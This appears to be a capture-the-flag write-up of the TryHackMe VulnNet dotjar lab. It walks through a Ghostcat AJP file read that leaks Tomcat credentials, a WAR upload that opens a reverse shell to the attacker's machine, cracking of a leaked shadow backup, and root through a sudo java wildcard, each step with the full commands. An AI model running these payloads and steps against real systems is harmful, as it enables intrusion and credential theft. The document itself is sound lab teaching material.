---
layout: post
title: TryHackMe - VulnNet dotjar Write-Up
date: 2026-09-18
classes: wide
description: Turning an exposed AJP connector into a credential leak, then using Tomcat's text interface to deploy a WAR and land a shell.
---

# TryHackMe - VulnNet dotjar Write-Up

VulnNet Entertainment is back, and this time the whole machine is **Java**. It's a **medium** room, and the interesting part isn't a hand-written web bug: it's the servlet container itself, and how much it trusts whoever is talking to it.

The machine came up at `10.144.168.18`, so I've added it to `/etc/hosts` as `vulnnet.thm` — from here on the commands use the hostname, which is what I actually typed.

## Initial Scanning

As usual, the first step is to see what is exposed. **Rustscan** for the port sweep, then **nmap** for the fingerprints:

```sh
rustscan -a 10.144.168.18 --scripts none
nmap -sV -sC -p22,8009,8080 -Pn -oN scans/nmap.txt 10.144.168.18
```

And the scan:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three ports, and two of them tell a story on their own:

- **8080** is **Apache Tomcat 9.0.30**, with the default Tomcat landing page.
- **8009** is **AJP13** — the Apache JServ Protocol.

The version is the first thing worth writing down: **9.0.30 is one release before 9.0.31**, and 9.0.31 is where the AJP hardening for **CVE-2020-1938** (Ghostcat) landed. So the connector on this box is inside the vulnerable window.

## AJP Is Not HTTP

AJP exists so a front-end web server (usually Apache httpd) can hand requests to Tomcat in a compact binary format. It is not meant to be reachable by clients: the whole protocol is built on the assumption that the thing talking to it is a **trusted proxy** sitting in front of the container.

Here there is no front-end at all — no **80**, no **443**. The connector is simply open to the network. And when a protocol trusts its peer that completely, being the peer is the whole game.

That trust shows up in a very concrete place. The AJP **Forward Request** message carries the client address inside the packet, and Tomcat copies those fields straight into the request object. Nothing compares them against the real TCP peer:

```
java/org/apache/coyote/ajp/AjpProcessor.java  (Tomcat 9.0.30)
  630:  requestHeaderMessage.getBytes(request.remoteAddr());
  631:  requestHeaderMessage.getBytes(request.remoteHost());
```

And the valve that decides who may reach the admin apps reads exactly that value:

```
RemoteAddrValve.invoke():  property = request.getRequest().getRemoteAddr();
```

So whoever speaks AJP picks their own source address. I poked the connector with **AJPFuzzer** first to get a feel for it — the tool takes the address fields as plain arguments, which is a fairly loud hint about how much of the message is client-controlled:

```sh
java -jar ajpfuzzer_v0.7.jar connect vulnnet.thm 8009 genericfuzz 2 "HTTP/1.1" "/" "127.0.0.1" "127.0.0.1" "127.0.0.1" 8009 false
```

## Reading the App's Own Paperwork

Ghostcat gives two things: reading files inside a deployed web application, and having the container process one of those files as a JSP. For the first half I went with the **Metasploit** module, which keeps the whole thing to a single command line and drops the loot in `~/.msf4/loot/`:

```sh
msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat;set rhosts vulnnet.thm;set filename /WEB-INF/web.xml;run"
```

Only two options needed setting — `RPORT` already defaults to **8009** and `FILENAME` already points at `/WEB-INF/web.xml`.

`/WEB-INF/web.xml` is the application's own descriptor, and the deployer had used the `<description>` field as a notice board:

![The web.xml description block leaking developer credentials](/assets/img/post/thm_vulnnetdotjar/2.png)

Three sentences worth more than the XML around them:

- the account: `webdev:Hgj3LA$02D$Fa@21`
- **"GUI access is disabled for security reasons"**
- and the general vibe of a company that writes its passwords into application metadata

## Trying the GUI Anyway

My first move with a credential is always to try it somewhere. Even when a note says an access method is disabled, that's a statement about intent — not a fact about the system. So I went straight at the **manager** over HTTP.

![Browser asking for Basic auth against the Tomcat manager](/assets/img/post/thm_vulnnetdotjar/1.png)

The login was accepted, and then Tomcat answered **403**. Which is the interesting part, because in Tomcat "no access to the manager" can mean two completely different things:

- the **origin** is not allowed — the stock `manager` and `host-manager` apps ship a `RemoteAddrValve` that only accepts `127.0.0.1` and `::1`
- the **account lacks the role** — the manager exposes four different interfaces, each with its own role (`manager-gui` for the HTML GUI, `manager-script` for the text API, `manager-status`, and `admin-gui` for the host-manager)

Here it was the second one. And the phrasing in that 403 page is worth reading slowly: **the text and JMX interfaces are not the GUI**. "GUI access is disabled" describes a role, and roles come in fours. The account could not have the HTML interface — but Tomcat's own documentation tells you not to give a user both `manager-gui` and `manager-script` at once, because the GUI is CSRF-protected and the text API is not. A developer account is exactly the one that ends up with the script interface.

## Deploying the WAR Without the GUI

The **text API** is meant for tooling, takes plain HTTP, and has no CSRF token to negotiate. Its `deploy` endpoint accepts a WAR upload directly by `PUT`:

```sh
msfvenom -p java/jsp_shell_reverse_tcp lhost=tun0 lport=4444 -f war -o shell.war

msfconsole -q -x "use multi/handler;set payload java/jsp_shell_reverse_tcp;set lhost tun0;run -jz"

curl -u 'webdev:Hgj3LA$02D$Fa@21' --upload-file shell.war "http://vulnnet.thm:8080/manager/text/deploy?path=/shell"
```

This is the step that is easy to misread as an **upload vulnerability**. It isn't one. The manager's job is to install applications, and an installed application *is* code that the container will run. Deploying a WAR is remote code execution performed by design — the permission is the security control, and the control walked out of the door with the credentials. Two of the typos on the way there are still in my history, which is how real runs look.

The WAR contains a JSP, so as soon as the context is up, requesting the app executes it with the privileges of the **Tomcat user**:

```sh
curl http://vulnnet.thm:8080/shell/
```

And that is a shell as `web`. From there I handed it to **Penelope**, which turns the raw connection into a proper interactive session:

```sh
penelope 4444
```

## What `web` Can Read

First thing after landing: **linpeas**, plus the usual manual pass. One line in `/var/backups` stood out immediately:

![The world-readable shadow backup in /var/backups](/assets/img/post/thm_vulnnetdotjar/3.png)

```
web@ip-10-144-168-18:/$ ll /var/backups/shadow-backup-alt.gz
-rw-r--r-- 1 root root 485 Jan 16  2021 /var/backups/shadow-backup-alt.gz

web@ip-10-144-168-18:/$ gunzip -l /var/backups/shadow-backup-alt.gz
         compressed        uncompressed  ratio uncompressed_name
                485                1179  61.0% /var/backups/shadow-backup-alt
```

A **backup of `/etc/shadow`**, sitting in a directory any user can read, with permissions that let any user read it. The `root` line and the `jdk-admin` line are both in there. I pulled that file down along with `/etc/passwd` — you need both, because `unshadow` combines them into the single-line format the cracking tools expect.

## Unshadow and Hashcat

```sh
unshadow passwd shadow > raw.txt
hashcat --identify raw.txt
hashcat -m 1800 -O raw.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --outfile-format=1,2 --outfile=cracked.txt
```

:bulb: Quick Tip: `--outfile-format=1,2` saves each cracked line as `hash:password` instead of just the password, which makes it trivial to `grep` a specific account out of the results later. On hashcat 7 the format list is positional, so you compose it.

And the output:

```
$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:794613852
```

`jdk-admin:794613852` — a local account with a password that `rockyou.txt` had already seen. `su` and I was that user.

## The Root Step

`jdk-admin` is not a normal user on this box, and `sudo -l` explains why:

```
Matching Defaults entries for jdk-admin on ip-10-144-168-18:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User jdk-admin may run the following commands on ip-10-144-168-18:
    (root) /usr/bin/java -jar *.jar
```

**Root can run Java. Specifically: root can run any `*.jar`.** That's a wildcard, which means it isn't really one permission — it's permission to execute any JAR I can write. `jdk-admin` is a developer account, so writing a JAR in its own home is trivial:

```sh
msfvenom -p java/meterpreter/reverse_tcp lhost=tun0 lport=4444 -f jar -o shell.jar
cat shell.jar | base64 -w0
```

The JAR goes up as a **base64 blob** pasted straight into the shell and decoded there — no upload channel needed, and the binary never has to survive a terminal:

```sh
echo '<base64 blob>' | base64 -d > shell.jar
```

Then the interesting part: I let `sudo` run it.

```sh
sudo /usr/bin/java -jar shell.jar
```

**Metasploit** catches the session, and this time it's a **Meterpreter** one, so the payload gives a proper stage instead of a bare reverse TCP:

![Meterpreter session as root and the root flag](/assets/img/post/thm_vulnnetdotjar/4.png)

```
meterpreter > shell
python3 -c "import pty;pty.spawn('/bin/bash')"
root@ip-10-144-168-18:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Root. The user flag was waiting in `web`'s home, and the root flag in `/root` — `THM{1ae87fa6...}` and `THM{464c29e3...}`.

## Lessons Learned

This machine is a story about **metadata and defaults**. The credentials were not stolen or cracked on the way in — they were published, by the deployer, in the application's own descriptor, right next to the line that told me which interface they were for. The connector on **8009** shipped enabled on every interface, and it treats its peer as a trusted proxy: a client speaking AJP declares its own source address, and every host-based trust decision downstream believes it. Then a **backup of `/etc/shadow`** sat in a world-readable directory, and one weak local password turned a shell as `web` into `jdk-admin` — who had root with a wildcard pointing at a file type *I* can produce.

The reusable version: read the service fingerprint as a version window, read configuration files as human documents, and remember that "this interface is disabled" is a description of a role, not of a system. Roles come in fours, and permissions with a wildcard are permissions you can write into.

Hack on!
